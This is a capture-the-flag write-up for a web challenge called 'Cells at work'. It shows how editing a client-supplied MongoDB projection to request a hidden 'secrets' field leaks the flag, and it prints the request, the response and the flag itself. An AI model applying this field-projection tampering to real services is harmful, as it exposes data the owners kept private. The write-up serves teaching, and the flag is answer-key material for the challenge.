# IRS Internal CTF: Web

## Cells at work (sheepymeh) [75 Points]

**Some friends made [this website](https://server.sheepymeh.tk/) to share their favorite anime! They wanted to learn something new here, so they don't know how to use it properly. But it works...?**

**But we all know that everyone keeps some *secrets*. Find out what they are and tell me, for um blackmail material I mean to know them better.**

### Solution

Welcome to the most overvalued challenge of the day. This challenge is a web challenge, using MongoDB. This isn't clear at first, but should be quite obvious once we start looking at the requests being sent:

```json
{
    "query": "",
    "info":{
        "name": 1,
        "score": 1,
        "description": 1
    }
}
```

To anyone who knows anything about Mongo, it should be instantly clear that `info` is a [MongoDB Projection](https://docs.mongodb.com/manual/reference/method/db.collection.find/#db.collection.find). If this wasn't clear, the hint should help (it provides the source code). Alternatively, it's pretty obvious that the `info` object is just a bunch of keys to retrieve from the server.

Now, a very simple "injection" (haha cells at work immune system vaccination injection haha) needs to be performed. The hint given in the challenge description was the word "secrets", which was in italics. Editing the query:

```json
{
    "query": "",
    "info":{
        "name": 1,
        "score": 1,
        "description": 1,
        "secrets": 1
    }
}
```

We get this response:

```json
{
    "_id":"5ede4e815df37d1a64f55420",
    "name":"Karakai Jouzu no Takagi-san 2",
    "score":8,
    "description":"\"If you blush, you lose.\" ... even once in the end?",
    "secret":"IRS{1F_Y0U_N33D_M0R3_R3CC0M3ND4T10N5_A5K_M3}"
}
```

### Flag

```
IRS{1F_Y0U_N33D_M0R3_R3CC0M3ND4T10N5_A5K_M3}
```